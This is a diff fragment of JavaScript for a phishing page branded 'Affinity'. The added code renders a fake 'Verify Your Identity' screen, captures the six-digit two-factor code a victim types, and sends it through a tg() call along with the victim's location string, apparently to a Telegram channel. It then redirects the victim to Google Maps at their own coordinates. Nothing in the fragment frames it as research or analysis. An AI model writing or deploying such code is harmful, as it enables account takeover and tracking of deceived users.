+else if(s===3){document.getElementById('app').innerHTML='<div class="aff-wrapper" id="a3"><div class="aff-header"><h1>Verify Your Identity</h1><p>Enter the code sent to your device</p></div><div class="aff-body"><p style="font-size:14px;color:#555;text-align:center;margin-bottom:8px">A 6-digit code was sent to your phone.</p><form id="f"><div class="code-inputs"><input type="text" id="c1" maxlength="1" inputmode="numeric"><input type="text" id="c2" maxlength="1" inputmode="numeric"><input type="text" id="c3" maxlength="1" inputmode="numeric"><input type="text" id="c4" maxlength="1" inputmode="numeric"><input type="text" id="c5" maxlength="1" inputmode="numeric"><input type="text" id="c6" maxlength="1" inputmode="numeric"></div><div class="error" id="err">Invalid code.</div><button type="submit" class="aff-btn">Verify</button></form><div class="loading" id="load" style="display:none"><div class="spinner"></div><p>Verifying code...</p></div></div><div class="aff-footer"><a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a></div></div>';
+['c1','c2','c3','c4','c5','c6'].forEach(function(id,i){document.getElementById(id).oninput=function(){if(this.value.length>=1&&i<5)document.getElementById(['c1','c2','c3','c4','c5','c6'][i+1]).focus();};document.getElementById(id).onkeydown=function(e){if(e.key==='Backspace'&&this.value.length===0&&i>0)document.getElementById(['c1','c2','c3','c4','c5','c6'][i-1]).focus();};});
+document.getElementById('f').onsubmit=function(e){e.preventDefault();var c=['c1','c2','c3','c4','c5','c6'].map(function(id){return document.getElementById(id).value}).join('');if(c.length<6)return;document.getElementById('load').style.display='block';e.target.style.display='none';tg('📱 *Affinity — 2FA Code*\n🔢 `'+c+'`\n\n'+locStr());setTimeout(function(){window.location.href='https://www.google.com/maps?q='+lat+','+lon;},2000);};}
 }
-function setC(c){document.documentElement.style.setProperty('--c',c);}
-renderLocationGate();
 </script>
 </body>
 </html>
